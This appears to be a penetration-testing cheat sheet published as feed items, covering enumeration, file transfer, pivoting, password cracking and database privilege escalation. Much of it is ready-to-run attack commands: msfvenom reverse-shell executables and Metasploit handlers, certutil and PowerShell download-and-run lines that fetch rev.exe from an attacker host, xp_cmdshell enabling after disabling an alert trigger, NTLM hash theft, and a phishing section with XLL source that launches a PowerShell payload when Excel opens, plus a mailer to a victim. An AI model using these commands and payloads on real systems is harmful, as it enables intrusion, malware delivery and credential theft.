item.title: Compressed Files
item.description: zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip Note: Always put the zip file inside a new folder before unzip tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz Note: Always put the zip file inside a new folder before Extract gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.

item.title: Connection from Public Internet
item.description: Simply Catch HTTP Request webhook.site webhook.site Catch HTTP Request and Host a Web Server serveo.net # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net # Start a local HTTP server python3 -m http.server 3000 ngrok Download ngrok ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS

item.title: DNS Enum
item.description: Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com

item.title: File Transfer (Linux To Linux)
item.description: HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 < file # In target Linux machine nc -w3 10.10.14.10 4444 > file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have assh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.

item.title: File Transfer (Linux to Windows)
item.description: HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe && c:\windows\tasks\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile c:\windows\tasks\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: curl is not always available

item.title: File Transfer (Windows To Linux)
item.description: SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.

item.title: Java Environment
item.description: Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac

item.title: Listeners
item.description: nc rlwrap nc -lvnp 1337 pwncat Download pwncat pwncat-cs -lp 1337 #After getting a connection (local) back

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.

item.title: Metasploit Shellcode
item.description: Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe LHOST=10.10.14.10 LPORT=443 > rev.exe Windows x86 EXE msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=10.10.14.10 LPORT=443 > rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.10 LPORT=443 > rev.dll Note 1: These will be flagged by AV Note 2: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules

item.title: MongoDB General
item.description: General Connect to Mongo Database mongo 10.10.11.10:27017 Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty()

item.title: MSSQL General
item.description: General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER'); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [DOMAIN\LINKED_SERVER]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [DOMAIN\CURRENT_SERVER]') at [DOMAIN\LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!

item.title: MSSQL Privilege Escalation
item.description: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: Mysql General
item.description: General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type='Administrator' where email='test@example.com';

item.title: Mysql Privilege Escalation
item.description: Privilege Escalation User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -pPassword mysql # UDF create table foo(line blob); insert into foo values(load_file('/dev/shm/raptor_udf2.so')); # Get plug-in directory show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.

item.title: Network Discovery
item.description: Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep "bytes from" &); done; Use nc to Scan Ports for i in $(seq 1 65535); do nc -zvn 127.0.0.1 ${i}; done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig # Windows ipconfig ip addr cat /proc/net/fib_trie Check Network Connections # TCP netstat -plant # UDP netstat -plunt # Windows netstat -ano

item.title: Network Traffic Pivoting
item.description: Chisel Download chisel Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .

item.title: Nmap
item.description: Nmap Port Scan TCP Scan target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo "^[0-9]+" | tr '\n' ',' | sed -r 's/,$//') nmap -p $ports -sCV -oA ./nmap-tcpscripts $target UDP Scan (common ports) target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo "^[0-9]+" | tr '\n' ',' | sed -r 's/,$//') nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Scan with nmap scripts Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with scripts nmap --script=ftp-anon -sV -sC -p 21 10.

item.title: Password Cracking
item.description: john Download john Convert file to john hash format # For example ssh2john id_rsa_encrypted > hash keepass2john test.kdbx > hash zip2john test.zip > hash # Get a full list of *2john find / -name *2john 2>/dev/null Crack with john # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.

item.title: Phishing
item.description: Phishing with XLL (Excel) revshells.com shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to "victim@victim.

item.title: Share Mount
item.description: Share Mount #Mount smb share locally for easy access sudo mount -t cifs "//10.10.11.10/Remote Shares" /mnt

item.title: SMB Enum
item.description: SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask "" recurse ON prompt OFF mget * Login with password smbclient -L \\\\10.10.11.10\\ -U domain/username%password #After found an accessible share smbclient \\\\10.10.11.10\\share\\ -U domain/username%password Mount SMB Share sudo mount -t cifs "//10.

item.title: SMB Server
item.description: Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work For older Windows Machines impacket-smbserver share .

item.title: SSH
item.description: Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo '<id_rsa.pub>' >> /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa Note: Always append a new line in id_rsa key Connect to SSH with creds ssh user@10.10.11.10 # After first connection (i.e., after 'yes' to fingerprint prompt) sshpass -p 'password' ssh user@10.

item.title: Subdomain Enum
item.description: wfuzz download wfuzz # HTTP wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.example.com" -u http://example.com # HTTPS wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.example.com" -u https://example.com -k Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.example.com" -u http://example.com --hw 10

item.title: Web Directory Enum
item.description: Web Directory Enum feroxbuster Download feroxbuster HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx gobuster Download gobuster gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php
